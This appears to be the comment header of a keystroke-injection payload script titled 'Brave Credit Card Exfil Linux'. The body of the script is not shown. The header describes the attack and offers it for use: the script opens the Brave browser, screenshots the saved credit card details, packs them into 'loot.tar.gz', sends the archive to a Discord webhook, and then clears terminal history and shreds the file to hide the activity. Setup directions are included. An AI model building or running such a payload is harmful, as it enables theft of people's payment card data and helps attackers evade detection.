REM TITLE: Brave Credit Card Exfil Linux
REM AUTHOR: OSINTI4L
REM TARGET OS: Linux (tested on Pop!_OS)
REM DESCRIPTION: Opens Brave Browser, navigates to payment methods settings menu, and takes a screenshot of the credit card credentials on file. It then closes the browser, tarballs all screenshots in Pictures/Screenshots as "loot.tar.gz", and exfiltrates them via Discord webhook. Terminal session history is cleared and the tarball is shredded post exfiltration to obfuscate activity. To work, add Discord webhook to line 74 and path to Screenshots directory on line 76.
